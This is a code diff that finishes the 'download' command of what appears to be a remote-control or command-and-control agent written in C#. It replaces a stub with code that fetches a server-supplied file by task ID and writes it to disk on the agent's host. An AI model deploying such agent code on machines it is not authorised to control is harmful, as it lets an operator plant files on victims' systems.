@@ -12,26 +12,20 @@ namespace Agent.Commands
     {
         public override string Name => "download";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            throw new NotImplementedException();
-            //var fileName = task.FileName;
+            this.CheckFileDownloaded(task, context);
 
-            //var fileContent = commm.Download(task.FileId, a =>
-            //{
-            //    result.Info = $"Downloading {fileName} ({a}%)";
-            //    commm.SendResult(result);
-            //}).Result;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            string fileName = file.Name;
+            var fileContent = file.GetFileContent();
 
+            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
+            {
+                fs.Write(fileContent, 0, fileContent.Length);
+            }
 
-            //this.Notify(result, commm, $"{fileName} Downloaded");
-
-            //using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
-            //{
-            //    fs.Write(fileContent, 0, fileContent.Length);
-            //}
-
-            //result.Result = $"File dowloaded to {fileName}.";
+            context.Result.Result = $"File downloaded to {fileName}.";
         }
     }
 }
